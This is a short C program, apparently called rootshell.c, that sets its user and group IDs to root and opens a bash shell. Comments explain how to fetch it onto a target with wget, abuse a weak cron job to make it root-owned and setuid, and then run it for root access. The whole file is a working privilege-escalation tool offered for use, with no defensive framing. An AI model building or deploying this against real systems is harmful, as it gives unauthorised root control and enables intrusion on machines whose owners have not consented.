int main(void)
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
/* create this program using gcc -o rootshell rootshell.c */
/* wget this from the target. Modify a weak cron task to  */
/* exec('chown root:root rootshell;chmod 4755 rootshell') */
/* check the perms after cron task executes, then run prog*/
